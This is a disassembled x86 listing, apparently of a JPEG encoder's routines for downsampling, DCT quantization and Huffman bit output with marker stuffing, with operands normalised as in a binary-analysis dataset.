lea eax [ esi - 0x4 ]
shl edx 0x3
mov [ ebp - 0x10 ] edx
mov ecx [ ebp - 0x10 ]
push ecx
mov edx [ ebx + 0xe8 ]
mov ecx [ ebx + 0x1c ]
add edx 0x2
call sub_49b1a8
mov eax [ ebx + 0xbc ]
mov ecx 0x10000
mov edx eax
shl edx 0x9
sub ecx edx
mov edx esi
shl eax 0x6
mov [ ebp - 0x24 ] ecx
mov [ ebp - 0x28 ] eax
xor eax eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x34 ] edx
mov ecx [ ebp + 0x8 ]
mov eax ecx
mov [ ebp - 0x30 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
cmp edx [ ebp - 0x8 ]
jg r-xdata
mov edx [ ebp - 0x30 ]
mov ecx [ edx ]
mov [ ebp - 0x1c ] ecx
mov eax [ ebp - 0x34 ]
mov edx [ ebp - 0x34 ]
mov ecx [ eax ]
mov eax [ edx - 0x4 ]
mov [ ebp - 0x14 ] eax
mov edx [ ebp - 0x34 ]
mov eax [ edx + 0x4 ]
mov [ ebp - 0x18 ] eax
xor eax eax
mov edx [ ebp - 0x14 ]
mov ebx [ ebp - 0x18 ]
mov al [ ecx ]
inc ecx
movzx ebx [ ebx ]
movzx edx [ edx ]
inc [ ebp - 0x18 ]
inc [ ebp - 0x14 ]
add edx ebx
mov ebx [ ebp - 0x14 ]
add edx eax
movzx esi [ ebx ]
mov ebx [ ebp - 0x18 ]
movzx ebx [ ebx ]
add esi ebx
xor ebx ebx
mov bl [ ecx ]
add esi ebx
mov ebx edx
sub ebx eax
add ebx edx
add ebx esi
mov [ ebp - 0x20 ] ebx
imul eax [ ebp - 0x24 ]
mov ebx [ ebp - 0x20 ]
imul ebx [ ebp - 0x28 ]
add eax ebx
mov ebx [ ebp - 0x1c ]
add eax 0x8000
sar eax 0x10
mov [ ebx ] al
inc [ ebp - 0x1c ]
mov [ ebp - 0x2c ] edx
mov eax [ ebp - 0x10 ]
mov edx esi
sub eax 0x2
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jbe r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
xor eax eax
mov al [ ecx ]
mov ecx edx
sub ecx eax
add ecx [ ebp - 0x2c ]
add edx ecx
mov [ ebp - 0x20 ] edx
imul [ ebp - 0x24 ]
mov edx [ ebp - 0x20 ]
mov ecx [ ebp - 0x1c ]
imul edx [ ebp - 0x28 ]
add eax edx
add eax 0x8000
sar eax 0x10
mov [ ecx ] al
inc [ ebp - 0x8 ]
add [ ebp - 0x34 ] 0x4
add [ ebp - 0x30 ] 0x4
xor eax eax
mov al [ ecx ]
inc ecx
inc [ ebp - 0x14 ]
inc [ ebp - 0x18 ]
mov ebx [ ebp - 0x14 ]
movzx esi [ ebx ]
mov ebx [ ebp - 0x18 ]
movzx ebx [ ebx ]
add esi ebx
xor ebx ebx
mov bl [ ecx ]
add esi ebx
mov ebx edx
sub ebx eax
add ebx [ ebp - 0x2c ]
add ebx esi
mov [ ebp - 0x20 ] ebx
imul eax [ ebp - 0x24 ]
mov ebx [ ebp - 0x20 ]
imul ebx [ ebp - 0x28 ]
add eax ebx
mov ebx [ ebp - 0x1c ]
add eax 0x8000
sar eax 0x10
mov [ ebx ] al
inc [ ebp - 0x1c ]
mov [ ebp - 0x2c ] edx
dec [ ebp - 0xc ]
mov edx esi
cmp [ ebp - 0xc ] 0x0
ja r-xdata
sub_49b944
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx eax
mov eax ebx
mov ecx 0x34
mov [ esp + 0x4 ] 0x1
mov esi [ eax + 0x4 ]
mov edx 0x1
call [ esi ]
mov [ esp ] eax
mov eax [ esp ]
mov [ ebx + 0x160 ] eax
mov edx [ esp ]
mov [ edx ] sub_49b1a4
mov ecx [ esp ]
mov [ ecx + 0x4 ] sub_49b1f8
mov eax [ esp ]
xor edx edx
mov [ eax + 0x8 ] edx
cmp [ ebx + 0xb8 ] 0x0
je r-xdata
xor ebp ebp
mov esi [ ebx + 0x40 ]
mov eax [ esp ]
lea edi [ eax + 0xc ]
jmp r-xdata
mov ecx [ ebx ]
mov eax ebx
mov [ ecx + 0x14 ] 0x19
mov edx [ eax ]
call [ edx ]
cmp ebp [ ebx + 0x38 ]
jl r-xdata
mov eax [ esi + 0x8 ]
cmp eax [ ebx + 0xe4 ]
jne r-xdata
cmp [ ebx + 0xbc ] 0x0
je r-xdata
mov eax [ esi + 0x8 ]
add eax eax
cmp eax [ ebx + 0xe4 ]
jne r-xdata
mov edx [ esi + 0xc ]
cmp edx [ ebx + 0xe8 ]
jne r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ esp + 0x4 ] 0x0
jne r-xdata
mov eax [ esi + 0x8 ]
add eax eax
cmp eax [ ebx + 0xe4 ]
jne r-xdata
mov edx [ esi + 0xc ]
cmp edx [ ebx + 0xe8 ]
jne r-xdata
cmp [ ebx + 0xbc ] 0x0
je r-xdata
mov ecx [ ebx ]
mov eax ebx
xor edx edx
mov [ ecx + 0x14 ] 0x63
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov eax [ ebx + 0xe4 ]
cdq
idiv [ esi + 0x8 ]
test edx edx
jne r-xdata
mov edx [ esi + 0xc ]
add edx edx
cmp edx [ ebx + 0xe8 ]
jne r-xdata
xor ecx ecx
mov [ esp + 0x4 ] ecx
mov [ edi ] sub_49b3d8
jmp r-xdata
mov [ edi ] sub_49b38c
jmp r-xdata
mov [ edi ] sub_49b7b4
mov ecx [ esp ]
mov [ ecx + 0x8 ] 0x1
jmp r-xdata
mov eax [ ebx ]
mov [ eax + 0x14 ] 0x26
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov eax [ ebx + 0xe8 ]
cdq
idiv [ esi + 0xc ]
test edx edx
jne r-xdata
cmp [ ebx + 0xbc ] 0x0
je r-xdata
add edi 0x4
inc ebp
add esi 0x54
xor ecx ecx
mov [ esp + 0x4 ] ecx
mov [ edi ] sub_49b27c
jmp r-xdata
mov [ edi ] sub_49b46c
jmp r-xdata
mov [ edi ] sub_49b524
mov ecx [ esp ]
mov [ ecx + 0x8 ] 0x1
jmp r-xdata
sub_49bacc
push ebx
push esi
push edi
add esp 0xffffffd8
xor ecx ecx
mov [ esp ] eax
mov eax [ esp ]
mov edx [ eax + 0x164 ]
mov [ esp + 0x4 ] edx
mov [ esp + 0x8 ] ecx
mov eax [ esp ]
mov edx [ eax + 0x40 ]
mov [ esp + 0xc ] edx
jmp r-xdata
mov ecx [ esp ]
mov eax [ ecx + 0x38 ]
cmp eax [ esp + 0x8 ]
jg r-xdata
mov ecx [ esp + 0xc ]
mov ebx [ ecx + 0x10 ]
test ebx ebx
jl r-xdata
add esp 0x28
pop edi
pop esi
pop ebx
retn
mov edx [ esp ]
mov eax [ edx ]
mov [ eax + 0x14 ] 0x34
mov [ eax + 0x18 ] ebx
mov eax [ esp ]
mov edx [ eax ]
call [ edx ]
cmp ebx 0x4
jge r-xdata
mov eax [ esp + 0x4 ]
cmp [ eax + ebx * 4 + 0xc ] 0x0
jne r-xdata
dec ecx
je r-xdata
mov eax [ esp ]
cmp [ eax + ebx * 4 + 0x44 ] 0x0
jne r-xdata
mov eax [ esp + 0x4 ]
xor esi esi
mov edx rw-data
mov eax [ eax + ebx * 4 + 0xc ]
mov ecx eax
mov eax [ esp + 0x10 ]
mov eax [ esp ]
mov ecx 0x100
mov edx 0x1
mov esi [ eax + 0x4 ]
call [ esi ]
mov edx [ esp + 0x4 ]
mov [ edx + ebx * 4 + 0xc ] eax
mov eax [ esp + 0x4 ]
cmp [ eax + ebx * 4 + 0x20 ] 0x0
jne r-xdata
jmp r-xdata
mov ecx [ esp ]
mov eax [ ecx + ebx * 4 + 0x44 ]
mov [ esp + 0x10 ] eax
mov edx [ esp ]
mov ecx [ edx + 0xc0 ]
dec ecx
je r-xdata
movsx edi [ edx ]
movzx ebx [ eax ]
imul ebx edi
add ebx 0x400
add eax 0x2
sar ebx 0xb
add edx 0x2
mov [ ecx ] ebx
add ecx 0x4
inc esi
cmp esi 0x40
jl r-xdata
jmp r-xdata
mov eax [ esp + 0x4 ]
xor esi esi
mov ecx [ eax + ebx * 4 + 0x20 ]
xor eax eax
mov [ esp + 0x14 ] ecx
mov [ esp + 0x18 ] eax
mov [ esp + 0x20 ] rw-data
mov eax [ esp ]
mov ecx 0x100
mov edx 0x1
mov esi [ eax + 0x4 ]
call [ esi ]
mov edx [ esp + 0x4 ]
mov [ edx + ebx * 4 + 0x20 ] eax
mov eax [ esp ]
mov edx [ eax ]
mov [ edx + 0x14 ] 0x30
mov eax [ esp ]
mov edx [ eax ]
call [ edx ]
inc [ esp + 0x8 ]
add [ esp + 0xc ] 0x54
movzx edi [ eax ]
mov [ esp + 0x24 ] edi
fild [ esp + 0x24 ]
mov edi [ esp + 0x1c ]
fmul [ edi ]
fmul [ edx ]
fmul [ r-xdata ]
fdivr [ r-xdata ]
fstp [ ecx ]
inc esi
add ecx 0x4
add eax 0x2
inc ebx
add edx 0x8
cmp ebx 0x8
jl r-xdata
inc [ esp + 0x18 ]
add [ esp + 0x20 ] 0x8
cmp [ esp + 0x18 ] 0x8
jl r-xdata
xor ebx ebx
mov eax [ esp + 0x14 ]
lea ecx [ eax + esi * 4 ]
mov edx rw-data
mov eax [ esp + 0x20 ]
mov [ esp + 0x1c ] eax
mov eax [ esp + 0x10 ]
lea eax [ eax + esi * 2 ]
jmp r-xdata
sub_49bc84
push ebp
mov ebp esp
add esp 0xfffffee4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov eax [ eax + 0x164 ]
mov ecx [ eax + 0x8 ]
mov [ ebp - 0x8 ] ecx
mov edx [ edx + 0x10 ]
mov eax [ eax + edx * 4 + 0xc ]
xor edx edx
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x10 ]
shl eax 0x2
add [ ebp - 0x4 ] eax
mov [ ebp - 0x10 ] edx
mov ecx [ ebp - 0x10 ]
cmp ecx [ ebp + 0x8 ]
jae r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
mov eax [ ebp - 0x4 ]
lea edx [ ebp - 0x11c ]
mov ecx eax
xor ebx ebx
mov eax [ ecx ]
add ecx 0x4
add eax [ ebp + 0xc ]
inc ebx
movzx esi [ eax ]
inc eax
add esi 0xffffff80
mov [ edx ] esi
add edx 0x4
movzx esi [ eax ]
inc eax
add esi 0xffffff80
mov [ edx ] esi
add edx 0x4
movzx esi [ eax ]
inc eax
add esi 0xffffff80
mov [ edx ] esi
add edx 0x4
movzx esi [ eax ]
inc eax
add esi 0xffffff80
mov [ edx ] esi
add edx 0x4
movzx esi [ eax ]
inc eax
add esi 0xffffff80
mov [ edx ] esi
add edx 0x4
movzx esi [ eax ]
inc eax
add esi 0xffffff80
mov [ edx ] esi
add edx 0x4
movzx esi [ eax ]
inc eax
add esi 0xffffff80
mov [ edx ] esi
add edx 0x4
movzx eax [ eax ]
add eax 0xffffff80
mov [ edx ] eax
add edx 0x4
cmp ebx 0x8
jl r-xdata
lea eax [ ebp - 0x11c ]
call [ ebp - 0x8 ]
mov eax [ ebp - 0x10 ]
shl eax 0x7
add eax [ ebp + 0x14 ]
xor edx edx
mov [ ebp - 0x14 ] edx
mov ecx eax
mov [ ebp - 0x1c ] ecx
lea eax [ ebp - 0x11c ]
mov [ ebp - 0x18 ] eax
mov edx [ ebp - 0xc ]
mov esi edx
mov eax edi
sar eax 0x1
add ebx eax
cmp edi ebx
jg r-xdata
neg ebx
mov eax edi
sar eax 0x1
add ebx eax
cmp edi ebx
jg r-xdata
xor ebx ebx
mov eax ebx
cdq
idiv edi
mov ebx eax
jmp r-xdata
xor ebx ebx
mov eax ebx
cdq
idiv edi
mov ebx eax
jmp r-xdata
mov edi [ esi ]
mov eax [ ebp - 0x18 ]
mov ebx [ eax ]
test ebx ebx
jge r-xdata
inc [ ebp - 0x10 ]
add [ ebp + 0xc ] 0x8
mov edx [ ebp - 0x10 ]
cmp edx [ ebp + 0x8 ]
jb r-xdata
mov eax [ ebp - 0x1c ]
add esi 0x4
mov [ eax ] bx
inc [ ebp - 0x14 ]
add [ ebp - 0x1c ] 0x2
add [ ebp - 0x18 ] 0x4
cmp [ ebp - 0x14 ] 0x40
jl r-xdata
neg ebx
jmp r-xdata
sub_49bdd8
push ebp
mov ebp esp
add esp 0xfffffec8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov eax [ eax + 0x164 ]
mov ecx [ eax + 0x1c ]
mov [ ebp - 0x8 ] ecx
mov edx [ edx + 0x10 ]
mov eax [ eax + edx * 4 + 0x20 ]
xor edx edx
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x10 ]
shl eax 0x2
add [ ebp - 0x4 ] eax
mov [ ebp - 0x10 ] edx
mov ecx [ ebp - 0x10 ]
cmp ecx [ ebp + 0x8 ]
jae r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
mov eax [ ebp - 0x4 ]
lea edx [ ebp - 0x118 ]
mov ecx eax
xor ebx ebx
mov eax [ ecx ]
add ecx 0x4
add eax [ ebp + 0xc ]
inc ebx
movzx esi [ eax ]
add esi 0xffffff80
inc eax
mov [ ebp - 0x11c ] esi
fild [ ebp - 0x11c ]
fstp [ edx ]
movzx esi [ eax ]
add esi 0xffffff80
add edx 0x4
mov [ ebp - 0x120 ] esi
inc eax
fild [ ebp - 0x120 ]
fstp [ edx ]
movzx esi [ eax ]
add esi 0xffffff80
add edx 0x4
mov [ ebp - 0x124 ] esi
inc eax
fild [ ebp - 0x124 ]
fstp [ edx ]
movzx esi [ eax ]
add esi 0xffffff80
add edx 0x4
mov [ ebp - 0x128 ] esi
inc eax
fild [ ebp - 0x128 ]
fstp [ edx ]
movzx esi [ eax ]
add esi 0xffffff80
add edx 0x4
mov [ ebp - 0x12c ] esi
inc eax
fild [ ebp - 0x12c ]
fstp [ edx ]
movzx esi [ eax ]
add esi 0xffffff80
add edx 0x4
mov [ ebp - 0x130 ] esi
inc eax
fild [ ebp - 0x130 ]
fstp [ edx ]
movzx esi [ eax ]
add esi 0xffffff80
add edx 0x4
mov [ ebp - 0x134 ] esi
inc eax
fild [ ebp - 0x134 ]
fstp [ edx ]
movzx eax [ eax ]
add eax 0xffffff80
add edx 0x4
mov [ ebp - 0x138 ] eax
fild [ ebp - 0x138 ]
fstp [ edx ]
add edx 0x4
cmp ebx 0x8
jl r-xdata
lea eax [ ebp - 0x118 ]
call [ ebp - 0x8 ]
mov eax [ ebp - 0x10 ]
lea ebx [ ebp - 0x118 ]
shl eax 0x7
add eax [ ebp + 0x14 ]
xor edx edx
mov [ ebp - 0x18 ] edx
mov edi eax
mov eax [ ebp - 0xc ]
mov esi eax
fld [ ebx ]
fmul [ esi ]
fstp [ ebp - 0x14 ]
fld [ ebp - 0x14 ]
fadd [ r-xdata ]
call sub_48aba4
add ax 0xc000
add esi 0x4
mov [ edi ] ax
add edi 0x2
inc [ ebp - 0x18 ]
add ebx 0x4
cmp [ ebp - 0x18 ] 0x40
jl r-xdata
inc [ ebp - 0x10 ]
add [ ebp + 0xc ] 0x8
mov edx [ ebp - 0x10 ]
cmp edx [ ebp + 0x8 ]
jb r-xdata
sub_49bf68
push ebx
push esi
mov esi eax
mov ecx 0x30
mov edx 0x1
mov eax esi
mov ebx [ eax + 0x4 ]
call [ ebx ]
mov ebx eax
mov [ esi + 0x164 ] ebx
mov [ ebx ] sub_49bacc
mov eax [ esi + 0xc0 ]
dec eax
je r-xdata
mov [ ebx + 0x4 ] sub_49bc84
mov [ ebx + 0x8 ] sub_49cab8
jmp r-xdata
dec eax
je r-xdata
xor edx edx
lea eax [ ebx + 0xc ]
mov [ ebx + 0x4 ] sub_49bdd8
mov [ ebx + 0x1c ] sub_49cd24
jmp r-xdata
jmp r-xdata
xor ecx ecx
inc edx
mov [ eax ] ecx
xor ecx ecx
mov [ eax + 0x14 ] ecx
add eax 0x4
cmp edx 0x4
jl r-xdata
pop esi
pop ebx
retn
mov edx [ esi ]
mov eax esi
mov [ edx + 0x14 ] 0x30
mov edx [ eax ]
call [ edx ]
sub_49bfe4
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov edi eax
mov [ esp ] edx
mov ebx [ edi + 0x168 ]
mov [ ebx + 0x20 ] edi
mov eax [ esp ]
mov [ ebx + 0xc ] eax
cmp [ edi + 0x138 ] 0x0
sete dl
and edx 0x1
mov [ esp + 0x4 ] edx
cmp [ edi + 0x140 ] 0x0
jne r-xdata
cmp [ esp + 0x4 ] 0x0
je r-xdata
cmp [ esp + 0x4 ] 0x0
je r-xdata
mov [ ebx + 0x4 ] sub_49c71c
cmp [ ebx + 0x40 ] 0x0
jne r-xdata
mov [ ebx + 0x4 ] sub_49c674
jmp r-xdata
mov [ ebx + 0x4 ] sub_49c4c8
jmp r-xdata
mov [ ebx + 0x4 ] sub_49c394
jmp r-xdata
cmp [ esp ] 0x0
je r-xdata
mov eax edi
mov ecx 0x3e8
mov edx 0x1
mov esi [ eax + 0x4 ]
call [ esi ]
mov [ ebx + 0x40 ] eax
mov [ ebx + 0x8 ] sub_49c978
mov [ ebx + 0x8 ] sub_49c9b4
jmp r-xdata
mov ecx [ edi + 0xf0 ]
cmp ecx [ esp + 0x8 ]
jg r-xdata
xor eax eax
mov [ esp + 0x8 ] eax
lea edx [ ebx + 0x24 ]
mov [ esp + 0x10 ] edx
lea ecx [ edi + 0xf4 ]
mov [ esp + 0xc ] ecx
jmp r-xdata
mov eax [ esp + 0xc ]
mov edx [ esp + 0x10 ]
xor ecx ecx
mov eax [ eax ]
mov [ edx ] ecx
cmp [ esp + 0x4 ] 0x0
je r-xdata
xor eax eax
xor edx edx
mov [ ebx + 0x38 ] eax
mov [ ebx + 0x3c ] edx
xor ecx ecx
xor eax eax
mov [ ebx + 0x18 ] ecx
mov [ ebx + 0x1c ] eax
mov edx [ edi + 0xc4 ]
xor ecx ecx
mov [ ebx + 0x44 ] edx
mov [ ebx + 0x48 ] ecx
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
mov esi [ eax + 0x18 ]
mov [ ebx + 0x34 ] esi
cmp [ edi + 0x140 ] 0x0
jne r-xdata
lea edx [ ebx + esi * 4 + 0x4c ]
mov ecx esi
push edx
mov eax edi
mov edx [ esp + 0x8 ]
call sub_49d1e0
test esi esi
jl r-xdata
inc [ esp + 0x8 ]
add [ esp + 0x10 ] 0x4
add [ esp + 0xc ] 0x4
mov esi [ eax + 0x14 ]
jmp r-xdata
mov eax [ edi ]
mov [ eax + 0x14 ] 0x32
mov [ eax + 0x18 ] esi
mov eax edi
mov edx [ eax ]
call [ edx ]
cmp esi 0x4
jl r-xdata
cmp [ esp ] 0x0
je r-xdata
push 0x404
push 0x0
mov eax [ ebx + esi * 4 + 0x5c ]
push eax
call sub_48ab3c
add esp 0xc
jmp r-xdata
mov eax edi
mov ecx 0x404
mov edx 0x1
mov ebp [ eax + 0x4 ]
call [ ebp ]
mov [ ebx + esi * 4 + 0x5c ] eax
cmp [ ebx + esi * 4 + 0x5c ] 0x0
jne r-xdata
sub_49c16c
push ebx
mov ebx eax
push esi
mov eax [ ebx + 0x20 ]
mov esi [ eax + 0x18 ]
call [ esi + 0xc ]
test eax eax
jne r-xdata
mov ecx [ esi ]
mov [ ebx + 0x10 ] ecx
mov eax [ esi + 0x4 ]
mov [ ebx + 0x14 ] eax
pop esi
pop ebx
retn
mov eax [ ebx + 0x20 ]
mov edx [ eax ]
mov [ edx + 0x14 ] 0x18
mov edx [ eax ]
call [ edx ]
sub_49c19c
push ebx
mov ebx eax
push esi
push edi
push ebp
mov edi ecx
test edi edi
mov ebp [ ebx + 0x1c ]
mov esi edx
jne r-xdata
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov eax [ ebx + 0x20 ]
mov edx [ eax ]
mov [ edx + 0x14 ] 0x28
mov edx [ eax ]
call [ edx ]
pop ebp
pop edi
pop esi
pop ebx
retn
mov ecx edi
mov eax 0x1
shl eax cl
dec eax
add ebp edi
mov ecx 0x18
and esi eax
sub ecx ebp
shl esi cl
or esi [ ebx + 0x18 ]
cmp ebp 0x8
jl r-xdata
mov [ ebx + 0x18 ] esi
mov [ ebx + 0x1c ] ebp
mov edi esi
mov edx [ ebx + 0x10 ]
sar edi 0x10
inc [ ebx + 0x10 ]
and edi 0xff
mov eax edi
mov [ edx ] al
dec [ ebx + 0x14 ]
jne r-xdata
cmp edi 0xff
jne r-xdata
mov eax ebx
call sub_49c16c
shl esi 0x8
sub ebp 0x8
cmp ebp 0x8
jge r-xdata
mov edx [ ebx + 0x10 ]
inc [ ebx + 0x10 ]
mov [ edx ] 0x0
dec [ ebx + 0x14 ]
jne r-xdata
mov eax ebx
call sub_49c16c
sub_49c258
push ebx
cmp [ eax + 0xc ] 0x0
je r-xdata
mov edx [ eax + edx * 4 + 0x4c ]
mov ebx [ edx + ecx * 4 ]
movsx edx [ edx + ecx + 0x400 ]
mov ecx edx
mov edx ebx
call sub_49c19c
pop ebx
retn
mov eax [ eax + edx * 4 + 0x5c ]
inc [ eax + ecx * 4 ]
pop ebx
retn
sub_49c284
push ebx
push esi
push edi
mov edi eax
mov esi ecx
mov ebx edx
cmp [ edi + 0xc ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
retn
test esi esi
jbe r-xdata
movsx edx [ ebx ]
mov ecx 0x1
mov eax edi
call sub_49c19c
inc ebx
dec esi
test esi esi
ja r-xdata
sub_49c2b0
push ebx
mov ebx eax
push esi
mov eax [ ebx + 0x38 ]
test eax eax
jbe r-xdata
pop esi
pop ebx
retn
xor esi esi
jmp r-xdata
sar eax 0x1
jne r-xdata
inc esi
cmp esi 0xe
jle r-xdata
mov ecx esi
shl ecx 0x4
mov edx [ ebx + 0x34 ]
mov eax ebx
call sub_49c258
test esi esi
je r-xdata
mov eax [ ebx + 0x20 ]
mov edx [ eax ]
mov [ edx + 0x14 ] 0x28
mov edx [ eax ]
call [ edx ]
xor ecx ecx
mov [ ebx + 0x38 ] ecx
mov ecx [ ebx + 0x3c ]
mov edx [ ebx + 0x40 ]
mov eax ebx
call sub_49c284
xor eax eax
mov [ ebx + 0x3c ] eax
mov ecx esi
mov edx [ ebx + 0x38 ]
mov eax ebx
call sub_49c19c
sub_49c314
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_49c2b0
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov edx [ ebx + 0x20 ]
cmp [ edx + 0x138 ] 0x0
jne r-xdata
mov eax ebx
call sub_49c238
mov edx [ ebx + 0x10 ]
inc [ ebx + 0x10 ]
mov [ edx ] 0xff
dec [ ebx + 0x14 ]
jne r-xdata
xor eax eax
xor edx edx
mov [ ebx + 0x38 ] eax
mov [ ebx + 0x3c ] edx
pop esi
pop ebx
retn
xor edx edx
lea eax [ ebx + 0x24 ]
jmp r-xdata
mov ecx [ ebx + 0x10 ]
mov edx esi
inc [ ebx + 0x10 ]
add dl 0xd0
mov [ ecx ] dl
dec [ ebx + 0x14 ]
jne r-xdata
mov eax ebx
call sub_49c16c
mov ecx [ ebx + 0x20 ]
cmp edx [ ecx + 0xf0 ]
jl r-xdata
mov eax ebx
call sub_49c16c
xor ecx ecx
inc edx
mov [ eax ] ecx
add eax 0x4
pop esi
pop ebx
retn
sub_49c394
push ebx
push esi
push edi
mov edi eax
add esp 0xffffffe8
mov ebx edx
mov esi [ edi + 0x168 ]
mov eax [ edi + 0x144 ]
mov [ esp + 0x8 ] eax
mov edx [ edi + 0x18 ]
mov ecx [ edx ]
mov [ esi + 0x10 ] ecx
mov eax [ edi + 0x18 ]
mov edx [ eax + 0x4 ]
mov [ esi + 0x14 ] edx
cmp [ edi + 0xc4 ] 0x0
je r-xdata
xor ecx ecx
mov [ esp + 0x4 ] ecx
lea eax [ edi + 0x110 ]
mov [ esp + 0x14 ] eax
mov edx ebx
mov [ esp + 0x10 ] edx
jmp r-xdata
cmp [ esi + 0x44 ] 0x0
jne r-xdata
mov eax [ edi + 0x10c ]
cmp eax [ esp + 0x4 ]
jg r-xdata
mov edx [ esi + 0x48 ]
mov eax esi
call sub_49c314
mov edx [ esp + 0x14 ]
mov ecx [ esp + 0x10 ]
mov edx [ edx ]
mov eax [ ecx ]
mov ecx [ edi + edx * 4 + 0xf4 ]
mov [ esp + 0xc ] ecx
movsx eax [ eax ]
mov ecx [ esp + 0x8 ]
sar eax cl
mov [ esp ] eax
mov eax [ esp ]
mov ecx [ esp ]
sub eax [ esi + edx * 4 + 0x24 ]
mov [ esi + edx * 4 + 0x24 ] ecx
mov [ esp ] eax
test eax eax
jge r-xdata
mov edx [ esi + 0x10 ]
mov eax [ edi + 0x18 ]
mov [ eax ] edx
mov edx [ esi + 0x14 ]
mov [ eax + 0x4 ] edx
mov eax [ edi + 0xc4 ]
test eax eax
je r-xdata
xor ebx ebx
test eax eax
je r-xdata
neg eax
dec [ esp ]
mov eax 0x1
add esp 0x18
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0x44 ] 0x0
jne r-xdata
cmp ebx 0xb
jle r-xdata
sar eax 0x1
inc ebx
test eax eax
jne r-xdata
dec [ esi + 0x44 ]
mov [ esi + 0x44 ] eax
inc [ esi + 0x48 ]
and [ esi + 0x48 ] 0x7
mov ecx [ esp + 0xc ]
mov edx [ ecx + 0x14 ]
mov ecx ebx
mov eax esi
call sub_49c258
test ebx ebx
je r-xdata
mov eax [ edi ]
mov [ eax + 0x14 ] 0x6
mov eax edi
mov edx [ eax ]
call [ edx ]
inc [ esp + 0x4 ]
add [ esp + 0x14 ] 0x4
add [ esp + 0x10 ] 0x4
mov ecx ebx
mov edx [ esp ]
mov eax esi
call sub_49c19c
sub_49c4c8
push ebx
push esi
push edi
push ebp
add esp 0xffffffe4
mov esi edx
mov [ esp ] eax
mov eax [ esp ]
mov ebx [ eax + 0x168 ]
mov eax [ esp ]
mov edx [ eax + 0x13c ]
mov [ esp + 0xc ] edx
mov ecx [ esp ]
mov eax [ ecx + 0x144 ]
mov [ esp + 0x10 ] eax
mov edx [ esp ]
mov ecx [ edx + 0x18 ]
mov eax [ ecx ]
mov [ ebx + 0x10 ] eax
mov edx [ esp ]
mov ecx [ edx + 0x18 ]
mov eax [ ecx + 0x4 ]
mov [ ebx + 0x14 ] eax
mov edx [ esp ]
cmp [ edx + 0xc4 ] 0x0
je r-xdata
mov ecx [ esi ]
mov [ esp + 0x14 ] ecx
xor esi esi
mov eax [ esp ]
mov edx [ eax + 0x138 ]
mov [ esp + 0x8 ] edx
mov ecx [ esp + 0x8 ]
lea eax [ ecx * 4 + rw-data ]
mov [ esp + 0x18 ] eax
mov edx [ esp + 0x8 ]
cmp edx [ esp + 0xc ]
jg r-xdata
cmp [ ebx + 0x44 ] 0x0
jne r-xdata
test esi esi
jle r-xdata
mov ecx [ esp + 0x18 ]
mov eax [ ecx ]
mov edx [ esp + 0x14 ]
movsx edi [ edx + eax * 2 ]
test edi edi
jne r-xdata
mov edx [ ebx + 0x48 ]
mov eax ebx
call sub_49c314
mov edx [ esp ]
mov eax [ edx + 0x18 ]
mov edx [ ebx + 0x10 ]
mov [ eax ] edx
mov ecx [ ebx + 0x14 ]
mov [ eax + 0x4 ] ecx
mov eax [ esp ]
mov eax [ eax + 0xc4 ]
test eax eax
je r-xdata
inc [ ebx + 0x38 ]
cmp [ ebx + 0x38 ] 0x7fff
jne r-xdata
test edi edi
jge r-xdata
inc esi
jmp r-xdata
mov eax 0x1
add esp 0x1c
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x44 ] 0x0
jne r-xdata
mov eax ebx
call sub_49c2b0
mov ecx [ esp + 0x10 ]
sar edi cl
mov [ esp + 0x4 ] edi
neg edi
mov ecx [ esp + 0x10 ]
sar edi cl
mov eax edi
not eax
mov [ esp + 0x4 ] eax
jmp r-xdata
inc [ esp + 0x8 ]
add [ esp + 0x18 ] 0x4
mov eax [ esp + 0x8 ]
cmp eax [ esp + 0xc ]
jle r-xdata
dec [ ebx + 0x44 ]
mov [ ebx + 0x44 ] eax
inc [ ebx + 0x48 ]
and [ ebx + 0x48 ] 0x7
cmp [ ebx + 0x38 ] 0x0
jbe r-xdata
inc esi
jmp r-xdata
test edi edi
jne r-xdata
cmp esi 0xf
jle r-xdata
mov eax ebx
call sub_49c2b0
mov ebp 0x1
jmp r-xdata
mov ecx 0xf0
mov edx [ ebx + 0x34 ]
mov eax ebx
call sub_49c258
sub esi 0x10
cmp esi 0xf
jg r-xdata
sar edi 0x1
jne r-xdata
inc ebp
cmp ebp 0xa
jle r-xdata
mov ecx esi
mov edx [ ebx + 0x34 ]
shl ecx 0x4
mov eax ebx
add ecx ebp
call sub_49c258
mov ecx ebp
mov edx [ esp + 0x4 ]
mov eax ebx
call sub_49c19c
xor esi esi
mov eax [ esp ]
mov edx [ eax ]
mov [ edx + 0x14 ] 0x6
mov eax [ esp ]
mov edx [ eax ]
call [ edx ]
sub_49c674
push ebx
push esi
mov ebx eax
push edi
push ebp
push ecx
mov esi [ ebx + 0x168 ]
mov eax [ ebx + 0x144 ]
mov [ esp ] eax
mov edi edx
mov edx [ ebx + 0x18 ]
mov ecx [ edx ]
mov [ esi + 0x10 ] ecx
mov eax [ ebx + 0x18 ]
mov edx [ eax + 0x4 ]
mov [ esi + 0x14 ] edx
cmp [ ebx + 0xc4 ] 0x0
je r-xdata
xor ebp ebp
mov eax edi
mov edi eax
jmp r-xdata
cmp [ esi + 0x44 ] 0x0
jne r-xdata
cmp ebp [ ebx + 0x10c ]
jl r-xdata
